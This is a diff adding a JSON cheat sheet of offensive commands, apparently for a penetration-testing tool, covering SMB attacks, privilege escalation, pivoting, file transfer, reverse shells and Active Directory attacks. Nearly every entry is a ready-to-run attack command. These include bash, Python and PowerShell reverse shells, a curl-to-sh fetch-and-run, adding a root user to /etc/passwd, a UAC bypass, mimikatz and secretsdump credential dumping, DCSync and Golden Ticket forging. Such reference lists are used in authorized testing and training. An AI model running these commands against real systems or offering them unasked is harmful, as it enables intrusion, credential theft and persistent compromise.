@@ -1,0 +1,79 @@
+[
+  {
+    "category": "SMB Attacks",
+    "techniques": [
+      {"id":"smb_1","name":"SMB Enumeration","purpose":"List shares and check access","when_to_use":"When SMB (445) is open","command":"smbclient -L //{TARGET_IP} -U '{USERNAME}%{PASSWORD}'","tags":["smb","enum"]},
+      {"id":"smb_2","name":"SMBMap Share Permissions","purpose":"Check read/write access on all shares","when_to_use":"After finding SMB shares","command":"smbmap -H {TARGET_IP} -u {USERNAME} -p {PASSWORD}","tags":["smb","smbmap"]},
+      {"id":"smb_3","name":"Connect to SMB Share","purpose":"Browse and download files from share","when_to_use":"When you have access to a share","command":"smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}'","tags":["smb","access"]},
+      {"id":"smb_4","name":"CrackMapExec SMB Enum","purpose":"Enumerate SMB info, users, shares","when_to_use":"Quick SMB recon with credentials","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --shares --users","tags":["smb","cme"]},
+      {"id":"smb_5","name":"Pass-the-Hash via CME","purpose":"Authenticate using NTLM hash","when_to_use":"When you have NTLM hash but not plaintext password","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -H {PASSWORD} --shares","tags":["smb","pth","cme"]},
+      {"id":"smb_6","name":"PSExec Shell via Impacket","purpose":"Get SYSTEM shell via SMB","when_to_use":"When you have admin credentials on Windows","command":"impacket-psexec {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","psexec","shell"]},
+      {"id":"smb_7","name":"WMIExec Shell","purpose":"Execute commands via WMI (no service install)","when_to_use":"Stealthier alternative to PSExec","command":"impacket-wmiexec {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","wmi","shell"]},
+      {"id":"smb_8","name":"SecretsDump - Dump Hashes","purpose":"Dump SAM/NTDS hashes remotely","when_to_use":"When you have admin access to Windows","command":"impacket-secretsdump {USERNAME}:{PASSWORD}@{TARGET_IP}","tags":["smb","hashes","impacket"]},
+      {"id":"smb_9","name":"Null Session Enum","purpose":"Enumerate SMB without credentials","when_to_use":"When SMB allows anonymous access","command":"enum4linux -a {TARGET_IP}","tags":["smb","null","enum"]}
+    ]
+  },
+  {
+    "category": "Privilege Escalation",
+    "techniques": [
+      {"id":"pe_1","name":"LinPEAS - Linux PrivEsc Enum","purpose":"Automated Linux privilege escalation checks","when_to_use":"After getting initial shell on Linux","command":"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","tags":["privesc","linux","linpeas"]},
+      {"id":"pe_2","name":"WinPEAS - Windows PrivEsc Enum","purpose":"Automated Windows privilege escalation checks","when_to_use":"After getting initial shell on Windows","command":".\\.\\winPEASx64.exe > winpeas_out.txt","tags":["privesc","windows","winpeas"]},
+      {"id":"pe_3","name":"Sudo -l Check","purpose":"List commands current user can run as sudo","when_to_use":"First check on any Linux shell","command":"sudo -l","tags":["privesc","linux","sudo"]},
+      {"id":"pe_4","name":"SUID Binary Search","purpose":"Find SUID binaries for privesc","when_to_use":"Linux privilege escalation","command":"find / -perm -4000 -type f 2>/dev/null","tags":["privesc","linux","suid"]},
+      {"id":"pe_5","name":"Crontab Enumeration","purpose":"Find writable cron jobs","when_to_use":"Linux privilege escalation","command":"cat /etc/crontab && ls -la /etc/cron*","tags":["privesc","linux","cron"]},
+      {"id":"pe_6","name":"Writable /etc/passwd","purpose":"Add root user if /etc/passwd is writable","when_to_use":"When /etc/passwd is world-writable","command":"echo 'hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker","tags":["privesc","linux"]},
+      {"id":"pe_7","name":"Token Impersonation (Windows)","purpose":"Impersonate SYSTEM token via SeImpersonatePrivilege","when_to_use":"When running as service account with SeImpersonatePrivilege","command":".\\PrintSpoofer64.exe -i -c cmd","tags":["privesc","windows","token"]},
+      {"id":"pe_8","name":"UAC Bypass via fodhelper","purpose":"Bypass UAC to get elevated shell","when_to_use":"When running as admin but UAC is blocking","command":"REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'cmd.exe' /f && fodhelper.exe","tags":["privesc","windows","uac"]},
+      {"id":"pe_9","name":"Mimikatz - Dump Credentials","purpose":"Dump plaintext passwords and hashes from memory","when_to_use":"After gaining SYSTEM/admin on Windows","command":"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit","tags":["privesc","windows","mimikatz"]},
+      {"id":"pe_10","name":"Kernel Exploit Search","purpose":"Find kernel exploits for current OS version","when_to_use":"When no other privesc vector found","command":"uname -a && cat /etc/os-release","tags":["privesc","linux","kernel"]}
+    ]
+  },
+  {
+    "category": "Pivoting",
+    "techniques": [
+      {"id":"piv_1","name":"Chisel Server (Attacker)","purpose":"Set up reverse SOCKS5 proxy","when_to_use":"When pivoting into internal network","command":"./chisel server -p 8001 --reverse","tags":["pivot","chisel","socks"]},
+      {"id":"piv_2","name":"Chisel Client (Target)","purpose":"Connect back to chisel server","when_to_use":"Run on compromised host","command":"./chisel client {TARGET_IP}:8001 R:socks","tags":["pivot","chisel","socks"]},
+      {"id":"piv_3","name":"Proxychains Config","purpose":"Route tools through SOCKS proxy","when_to_use":"After setting up chisel/SSH SOCKS proxy","command":"echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf && proxychains nmap -sT {PIVOT_IP}","tags":["pivot","proxychains"]},
+      {"id":"piv_4","name":"SSH SOCKS Proxy","purpose":"Create SOCKS5 proxy via SSH","when_to_use":"When you have SSH access to pivot host","command":"ssh -D 1080 -f -N {USERNAME}@{PIVOT_IP}","tags":["pivot","ssh","socks"]},
+      {"id":"piv_5","name":"Ligolo-ng Agent (Target)","purpose":"Fast tunneling via TUN interface","when_to_use":"Advanced pivoting with ligolo-ng","command":"./agent -connect {TARGET_IP}:11601 -ignore-cert","tags":["pivot","ligolo"]},
+      {"id":"piv_6","name":"Socat Port Forward","purpose":"Forward port from pivot to internal host","when_to_use":"Simple port forwarding on pivot","command":"socat TCP-LISTEN:8080,fork TCP:{PIVOT_IP}:80","tags":["pivot","socat"]}
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "techniques": [
+      {"id":"ft_1","name":"Python HTTP Server","purpose":"Serve files from attacker machine","when_to_use":"When transferring files to target","command":"python3 -m http.server 8080","tags":["transfer","python"]},
+      {"id":"ft_2","name":"Download via wget","purpose":"Download file from attacker HTTP server","when_to_use":"On Linux target","command":"wget http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh","tags":["transfer","wget","linux"]},
+      {"id":"ft_3","name":"Download via curl","purpose":"Download file silently","when_to_use":"On Linux target","command":"curl -s http://{TARGET_IP}:8080/file.sh -o /tmp/file.sh && chmod +x /tmp/file.sh","tags":["transfer","curl","linux"]},
+      {"id":"ft_4","name":"PowerShell Download","purpose":"Download file on Windows","when_to_use":"On Windows target","command":"powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{TARGET_IP}:8080/file.exe','C:\\\\Windows\\\\Temp\\\\file.exe')\"","tags":["transfer","powershell","windows"]},
+      {"id":"ft_5","name":"Certutil Download (Windows)","purpose":"Download file using certutil","when_to_use":"On Windows when PowerShell is restricted","command":"certutil -urlcache -split -f http://{TARGET_IP}:8080/file.exe C:\\Windows\\Temp\\file.exe","tags":["transfer","certutil","windows"]},
+      {"id":"ft_6","name":"SMB Server (Impacket)","purpose":"Host files over SMB for Windows targets","when_to_use":"When transferring to Windows without HTTP","command":"impacket-smbserver share . -smb2support","tags":["transfer","smb","windows"]},
+      {"id":"ft_7","name":"Base64 Encode/Decode Transfer","purpose":"Transfer files through shell as base64","when_to_use":"When no HTTP/SMB available","command":"base64 -w 0 file.sh && echo 'BASE64' | base64 -d > /tmp/file.sh","tags":["transfer","base64"]}
+    ]
+  },
+  {
+    "category": "Shells & Payloads",
+    "techniques": [
+      {"id":"sh_1","name":"Netcat Listener","purpose":"Catch incoming reverse shell","when_to_use":"Before triggering reverse shell payload","command":"nc -lvnp 4444","tags":["shell","netcat","listener"]},
+      {"id":"sh_2","name":"Bash Reverse Shell","purpose":"Send reverse shell from Linux target","when_to_use":"When bash is available on target","command":"bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1","tags":["shell","bash","reverse"]},
+      {"id":"sh_3","name":"Python Reverse Shell","purpose":"Reverse shell via Python","when_to_use":"When Python is available on target","command":"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{TARGET_IP}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"","tags":["shell","python","reverse"]},
+      {"id":"sh_4","name":"PowerShell Reverse Shell","purpose":"Reverse shell from Windows","when_to_use":"When PowerShell is available on Windows target","command":"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{TARGET_IP}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"","tags":["shell","powershell","reverse"]},
+      {"id":"sh_5","name":"msfvenom Windows EXE","purpose":"Generate Windows reverse shell payload","when_to_use":"When you can execute a binary on Windows","command":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f exe -o shell.exe","tags":["msfvenom","payload","windows"]},
+      {"id":"sh_6","name":"msfvenom PHP Webshell","purpose":"Generate PHP reverse shell payload","when_to_use":"When you can upload PHP files","command":"msfvenom -p php/reverse_php LHOST={TARGET_IP} LPORT=4444 -f raw -o shell.php","tags":["msfvenom","payload","php"]},
+      {"id":"sh_7","name":"Upgrade Shell to TTY","purpose":"Get fully interactive shell","when_to_use":"After catching a basic reverse shell","command":"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg","tags":["shell","tty","upgrade"]},
+      {"id":"sh_8","name":"Evil-WinRM Shell","purpose":"Get PowerShell shell via WinRM","when_to_use":"When WinRM (5985) is open and you have credentials","command":"evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}","tags":["shell","winrm","windows"]}
+    ]
+  },
+  {
+    "category": "Active Directory",
+    "techniques": [
+      {"id":"ad_1","name":"BloodHound Collection (SharpHound)","purpose":"Map AD attack paths","when_to_use":"After getting domain user credentials","command":"./SharpHound.exe -c All --zipfilename bloodhound.zip","tags":["ad","bloodhound"]},
+      {"id":"ad_2","name":"Kerberoasting","purpose":"Request TGS tickets for offline cracking","when_to_use":"When you have any domain user account","command":"impacket-GetUserSPNs {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile kerberoast.txt","tags":["ad","kerberoast","kerberos"]},
+      {"id":"ad_3","name":"ASREPRoasting","purpose":"Get hashes for users without pre-auth","when_to_use":"When you have a user list but no passwords","command":"impacket-GetNPUsers {TARGET_DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asrep.txt","tags":["ad","asrep","kerberos"]},
+      {"id":"ad_4","name":"DCSync Attack","purpose":"Dump all domain hashes as if you were a DC","when_to_use":"When you have DCSync rights (Domain Admin or delegated)","command":"impacket-secretsdump {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm","tags":["ad","dcsync","hashes"]},
+      {"id":"ad_5","name":"Pass-the-Ticket","purpose":"Use Kerberos ticket for lateral movement","when_to_use":"After extracting a TGT/TGS ticket","command":"impacket-psexec -k -no-pass {TARGET_DOMAIN}/{USERNAME}@{TARGET_IP}","tags":["ad","ptt","kerberos"]},
+      {"id":"ad_6","name":"Enumerate AD Users via CME","purpose":"List all domain users","when_to_use":"With valid domain credentials","command":"crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --users","tags":["ad","cme","enum"]},
+      {"id":"ad_7","name":"Golden Ticket Attack","purpose":"Forge Kerberos TGT for any user","when_to_use":"After obtaining KRBTGT hash","command":"impacket-ticketer -nthash {PASSWORD} -domain-sid S-1-5-21-XXXX -domain {TARGET_DOMAIN} Administrator","tags":["ad","golden","kerberos"]}
+    ]
+  }
+]
